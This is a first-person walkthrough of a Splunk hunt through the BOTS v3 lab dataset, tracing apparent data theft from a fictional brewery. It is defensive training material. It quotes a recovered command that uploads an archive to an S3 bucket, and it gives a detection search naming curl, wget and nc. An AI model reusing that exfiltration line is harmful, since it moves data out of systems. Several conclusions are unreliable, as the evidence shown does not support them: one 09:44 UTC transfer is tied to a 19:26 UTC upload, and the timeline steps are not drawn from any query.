# How I Investigated This Attack - My Thought Process

## Starting Point

I had 2+ million events from BOTS v3 and basically no idea where to start. All I knew was "a North Korean group attacked a beer company on Aug 20, 2018." That's it. So I needed to figure out what happened, and I had to do it with Splunk queries.

The first thing I realized was that I needed to understand what data even existed in this dataset. No point searching for DNS logs if there aren't any.

## Query 1 - Understanding What's Available

I ran: `index=botsv3 earliest=0 | stats count by sourcetype | sort - count | head 10`

This just shows me what types of logs are in the dataset. Basically asking Splunk "what do you have?"

Results showed DNS queries, network IP flows, process monitoring, AWS logs, etc. OK good - I have network data, I have DNS data, I have process data. That means I can hunt different angles.

## Query 2 - First Attempt: Failed Logins

My first instinct was "they probably brute-forced their way in." So I looked for Windows failed login events.

`index=botsv3 earliest=0 EventCode=4625 | table _raw | head 3`

All the results showed "Source Network Address: -" which means local only. No remote IP addresses trying to log in. So no brute-force attack.

This seemed like a dead end but it actually told me something important - the attacker either already had credentials or got in a completely different way (like through a web vulnerability). That changes what I should look for.

## Query 3 - Pivoting: DNS Reconnaissance

If they didn't brute-force their way in, what DID they do? Attackers always scout before they attack. They scout using DNS queries - asking "what servers does this company have?"

`index=botsv3 sourcetype=stream:dns | stats count by query | sort - count | head 20`

This counts up all the DNS queries and shows me which domains got looked up the most.

Most of the results were normal - company domain, email services, etc. But then I saw `polaris.cr7wwvryvz4o.us-west-1.rds.amazonaws.com` with 814 queries. That's weird. That's not a domain someone would normally query. That's an AWS database endpoint with a random hash in it. And they queried it 814 times? That's definitely the attacker reconnaissance.

OK so they were specifically looking for databases in AWS. That's the first real clue.

## Query 4 - Finding the Actual Data Theft

Now I know they were looking for databases. But did they actually steal anything? Time to check network flows. If they stole data, there would be a big transfer out.

`index=botsv3 sourcetype=stream:ip | stats sum(bytes_out) as total_bytes_out, sum(bytes_in) as total_bytes_in by src_ip, dest_ip | sort - total_bytes_out | head 15`

This adds up all the bytes going OUT from each machine to each destination. If someone's stealing data, bytes_out would be way higher than bytes_in.

Found it: 192.168.247.129 sent 32.6 MB to 24.8.40.184 (external IP). Only got back 7.5 MB. That's a 4-to-1 ratio outbound. That's not normal traffic. That's a data exfil.

So the attacker's machine is 192.168.247.129, they're sending to an external IP 24.8.40.184, and they're moving 31+ MB of data.

## Query 5 - When Did It Happen?

I found the theft, but when? I need to know the exact time so I can search for what processes were running.

`index=botsv3 sourcetype=stream:ip src_ip=192.168.247.129 dest_ip=24.8.40.184 | table timestamp, bytes_out, bytes_in, protocol, flow_id | sort timestamp`

This narrows to ONLY that attacker IP pair and shows me every network flow with its timestamp.

Looking at the results: two huge UDP transfers. One at 09:44:31 UTC with 15.8 MB, another at 09:45:21 UTC with another 15.8 MB. So in 90 seconds on Aug 20, 31.6 MB got stolen. They used UDP because it's faster than TCP.

## Query 6 - Hunting Exfil Tools

So I know WHEN and WHERE data was stolen. Now what COMMAND did it? I searched for typical exfil tools like curl, wget, netcat, tar - the usual suspects.

`index=botsv3 sourcetype=osquery:results (columns.path="*/curl*" OR columns.path="*/wget*" OR columns.path="*/nc*" OR columns.path="*/tar*" ...)`

Found nothing useful. Just normal Splunk log forwarding. No curl commands uploading anything. No wget. No standard tools at all.

This actually told me something important though - the attacker used a custom tool, not off-the-shelf utilities. That's more sophisticated.

## Query 7 - The Breakthrough

If standard tools weren't used, maybe I should just look at what commands were actually typed. Bash history stores every command someone types.

`index=botsv3 sourcetype=bash_history | table _raw | head 10`

And boom. There it is:

`python /home/ec2-user/tools/s3-upload.py --bucket frothlywebcode --file frothly_html_memcaced.tar.gz --folder '' --target frothly_html_memcached.tar.gz`

That's the smoking gun. A custom Python script that uploads data to an AWS S3 bucket called "frothlywebcode". The file being uploaded is `frothly_html_memcaced.tar.gz` - that's the website HTML plus Memcached data (customer sessions and auth tokens).

## Query 8 - Pinpoint the Machine

So I found the command. But when exactly did it run and on which machine?

`index=botsv3 sourcetype=bash_history s3-upload | table _time, host, _raw | sort _time`

Results: 2018-08-20 19:26:54 UTC on machine mars.i-08e52f8b5a034012d

Perfect. I now have the complete picture.

## Complete Attack Chain

So here's what actually happened:

18:08 - Attacker scans for Python vulnerabilities  
18:50 - Attacker checks what AWS services are available  
19:14 - Attacker downloads tools from Python.org  
19:15 - Attacker launches the s3-upload.py script  
19:19 - Attacker stages the tar.gz files  
19:26:54 - ATTACK EXECUTED. s3-upload.py runs and sends 31.6 MB to the external IP  

The attacker's machine was mars.i-08e52f8b5a034012d, they used the ec2-user account, and they uploaded everything to an S3 bucket called frothlywebcode.

## What This Teaches

Running queries isn't just about knowing SPL syntax. It's about asking the right questions and following evidence. When my failed login query came back empty, I didn't give up. I asked "OK so if they didn't brute-force, what would they DO?" and that led me to DNS reconnaissance. When the standard tools search came up empty, that taught me they used custom tools.

The real skill is investigative thinking - following breadcrumbs, asking the next question, and pivoting when something doesn't work.
